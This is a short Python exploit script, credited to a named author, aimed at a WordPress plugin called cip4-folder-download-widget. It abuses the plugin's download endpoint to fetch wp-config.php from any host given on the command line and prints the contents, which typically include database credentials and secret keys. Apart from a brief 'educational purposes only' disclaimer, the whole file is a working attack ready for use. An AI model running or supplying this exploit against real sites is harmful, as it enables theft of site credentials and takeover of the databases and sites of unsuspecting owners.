#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author: Kasper Larsen
# Twitter: @phoenixits
# PGP: keybase.io/phoenixit
#
#       Wordpress config.php reader
#       This was created for educational purposes only.

import requests
import sys

target = sys.argv[1]
path = "/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php"
url = "http://"+target+path
r = requests.get(url)
print("Target URL: %s " % url)
print("----------------------")
print(r.content)
